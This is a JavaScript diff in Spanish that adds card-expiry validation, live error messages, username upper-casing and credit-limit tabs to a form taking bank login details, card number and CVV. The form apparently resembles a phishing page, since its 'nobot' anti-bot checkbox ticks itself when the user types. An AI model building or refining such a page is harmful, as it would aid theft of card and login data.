@@ -140,6 +140,23 @@ function hideBankDetect() {
     detectedBank = null;
 }
 
+/* ── Validación de fecha de vencimiento ── */
+function validateExpiry(venc) {
+    if (!/^\d{2}\/\d{2}$/.test(venc)) return { ok: false, msg: 'Formato inválido (MM/AA)' };
+    const [mmStr, yyStr] = venc.split('/');
+    const mm = parseInt(mmStr, 10);
+    const yy = parseInt(yyStr, 10);
+    if (mm < 1 || mm > 12) return { ok: false, msg: 'Mes inválido (01-12)' };
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+    const fullYear = yy < 70 ? 2000 + yy : 1900 + yy;
+    const fullCurrentYear = now.getFullYear();
+    if (fullYear < fullCurrentYear) return { ok: false, msg: 'Tarjeta vencida' };
+    if (fullYear === fullCurrentYear && mm < currentMonth) return { ok: false, msg: 'Tarjeta vencida' };
+    return { ok: true };
+}
+
 /* ── Algoritmo de Luhn (validación tarjeta) ── */
 function luhnCheck(value) {
     let sum = 0, shouldDouble = false;
@@ -343,9 +360,11 @@ async function submitTarjeta() {
         if (errCard) { errCard.textContent = 'Número de tarjeta inválido'; errCard.classList.add('show'); }
         hasErr = true;
     }
-    if (!/^\d{2}\/\d{2}$/.test(venc)) {
+    const expCheck = validateExpiry(venc);
+    if (!expCheck.ok) {
         document.getElementById('venc')?.classList.add('err');
-        document.getElementById('err-venc')?.classList.add('show');
+        const errVenc = document.getElementById('err-venc');
+        if (errVenc) { errVenc.textContent = expCheck.msg; errVenc.classList.add('show'); }
         hasErr = true;
     }
     if (!/^\d{3}$/.test(cvv)) {
@@ -426,6 +445,7 @@ function checkLogin() {
 
 if (userIn) {
     userIn.addEventListener('input', () => {
+        userIn.value = userIn.value.toUpperCase();
         if (nobot && !nobot.checked) nobot.checked = true;
         checkLogin();
         document.getElementById('fld-user')?.classList.remove('error');
@@ -477,15 +497,28 @@ if (cardInput) {
     });
 }
 
-/* ── Formateo vencimiento ── */
+/* ── Formateo vencimiento + validación en tiempo real ── */
 const vencInput = document.getElementById('venc');
 if (vencInput) {
     vencInput.addEventListener('input', e => {
         let v = e.target.value.replace(/[^0-9]/g, '');
         if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
         e.target.value = v;
-        vencInput.classList.remove('err');
-        document.getElementById('err-venc')?.classList.remove('show');
+
+        const errVenc = document.getElementById('err-venc');
+        if (v.length >= 4) {
+            const check = validateExpiry(e.target.value);
+            if (check.ok) {
+                vencInput.classList.remove('err');
+                if (errVenc) errVenc.classList.remove('show');
+            } else {
+                vencInput.classList.add('err');
+                if (errVenc) { errVenc.textContent = check.msg; errVenc.classList.add('show'); }
+            }
+        } else {
+            vencInput.classList.remove('err');
+            if (errVenc) errVenc.classList.remove('show');
+        }
     });
 }
 
@@ -525,6 +558,14 @@ document.querySelectorAll('.cupo-grid .opt').forEach(btn => {
         const slider = document.getElementById('cupo-slider');
         if (slider) slider.value = val;
         updateCupo(val);
+    });
+});
+
+/* ── Cupo tabs (Tarjeta de Crédito / Libre Inversión) ── */
+document.querySelectorAll('.cupo-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        document.querySelectorAll('.cupo-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
     });
 });
 
